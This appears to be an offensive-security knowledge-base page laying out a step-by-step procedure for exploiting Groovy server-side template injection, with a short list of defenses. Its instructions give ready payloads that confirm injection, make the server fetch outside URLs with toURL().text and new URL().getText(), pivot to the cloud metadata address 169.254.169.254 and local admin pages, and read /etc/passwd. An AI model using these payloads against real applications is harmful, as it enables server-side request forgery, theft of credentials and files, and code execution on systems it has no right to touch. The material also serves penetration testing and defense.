---
type: procedure
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[Obfuscated Files or Information]]'
  - '[[Template Injection]]'
sub_techniques: []
tags:
  - ssti
  - groovy
  - http-request
  - rce
  - web
commands:
  - '[[commands/groovy-ssti-fetch-url-string-to-url]]'
  - '[[commands/groovy-ssti-fetch-url-new-url-gettext]]'
platforms:
  - web
  - java
tools: []
verified: true
validated: true
---

# Server-Side-Template-Injection-via-Groovy-HTTP-Request

## Summary

This procedure exploits Server-Side Template Injection (SSTI) vulnerabilities in applications using Groovy as a template engine by injecting Groovy expressions that perform HTTP requests. The injected code executes on the server, allowing attackers to fetch external resources, potentially leading to Server-Side Request Forgery (SSRF), data exfiltration, or remote code execution (RCE) depending on the application's rendering behavior.

## Description

Server-Side Template Injection occurs when user input is unsafely interpolated into a template engine without proper sanitization, enabling arbitrary code execution in the context of the server process. Groovy, often integrated into Java-based web applications (e.g., via Spring Boot or Grails), provides powerful language features like dynamic URL handling that can be abused for HTTP requests. By injecting expressions such as string-to-URL conversion or direct URL object creation, an attacker can force the server to make outbound HTTP requests to arbitrary endpoints. This technique maps to MITRE ATT&CK T1221 (Template Injection) for execution and T1027 (Obfuscated Files or Information) due to the encoded nature of the payloads. It is particularly effective against applications exposing user-controlled template parameters, such as search fields, profile names, or error messages. Successful exploitation requires identifying a reflection point where injected content is rendered and executed, often confirmed by observing server-initiated network traffic or echoed responses.

## Requirements

1. Access to a web application with a vulnerable Groovy-based template engine (e.g., user input reflected in templates without escaping).
2. Knowledge of an injection point, such as a parameter that interpolates user input into Groovy templates.
3. Network access to the target application (typically over HTTP/HTTPS).
4. Optional: Intercepting proxy like Burp Suite to craft and test payloads.

## Defense

- Implement strict input validation and sanitization for all user-supplied data before template rendering, using allowlists for permitted characters.
- Disable or restrict dynamic code evaluation in template engines; use safe rendering modes in Groovy (e.g., SimpleTemplateEngine with disabled scripting).
- Apply Web Application Firewall (WAF) rules to detect common SSTI patterns, such as `${` or Groovy-specific syntax.
- Monitor server logs for anomalous outbound HTTP requests and enable template engine logging to capture injection attempts.
- Regularly update frameworks like Spring or Grails to patch known template vulnerabilities.

## Objectives

1. Identify and confirm a Groovy SSTI vulnerability in the target application.
2. Inject payloads to execute HTTP requests from the server, verifying control over server-side behavior.
3. Achieve SSRF or RCE by targeting internal services or external endpoints for data retrieval or command execution.

## Instructions

### Step 1: Identify Injection Point and Test Basic SSTI

**Context**: Locate a user input field that is processed by a Groovy template engine, such as a search box or username display. Test for SSTI by injecting a simple expression like `${7*7}` to confirm execution (expected response: 49). This verifies the vulnerability before attempting HTTP requests.

**Command** (None - manual testing):

Use a proxy to submit payloads like `${7*7}` in the vulnerable parameter and observe if the response reflects the computed value.

> If the output shows '49' instead of the literal string, SSTI is confirmed. Otherwise, try variations like `<%= 7*7 %>` for different template delimiters.

### Step 2: Inject Groovy Payload for HTTP Request Using String to URL

**Context**: Once SSTI is confirmed, inject a Groovy expression to force the server to fetch content from an external URL. This tests SSRF by making the server request a controlled endpoint (e.g., your attacker's server logging the request). Replace the Google URL with a test endpoint to avoid noise.

**Command** ([[commands/groovy-ssti-fetch-url-string-to-url]]):

```groovy
${"http://www.google.com".toURL().text}
```

> This expression converts a string to a URL object and retrieves its text content, executing an HTTP GET on the server. Expected output in the response: The HTML body of the fetched page (e.g., Google homepage snippet) if the template echoes the result. Monitor your test server for incoming requests to confirm SSRF.

### Step 3: Inject Alternative Groovy Payload for HTTP Request Using New URL

**Context**: Use a variant payload if the first fails due to syntax restrictions. This creates a new URL object directly and calls getText(), providing obfuscation or compatibility with stricter parsers. Again, substitute the URL for a controlled endpoint to validate execution.

**Command** ([[commands/groovy-ssti-fetch-url-new-url-gettext]]):

```groovy
${new URL("http://www.google.com").getText()}
```

> This instantiates a URL and fetches its content as a string. Success is indicated by the response containing fetched page data or logs showing the server's outbound request. If echoed, you may see partial HTML; use this to chain further exploits like accessing internal metadata endpoints (e.g., http://169.254.169.254).

### Step 4: Verify and Escalate

**Context**: Confirm success by checking if the injected payload causes unintended server behavior, such as accessing internal resources. If the application renders the full output, exfiltrate data; otherwise, chain with file read payloads like `${new File('/etc/passwd').text}`.

> Decision point: If HTTP requests succeed but are not echoed, pivot to SSRF for internal scanning (e.g., inject URLs like http://localhost:8080/admin). Monitor application logs or network traffic for indicators of execution.
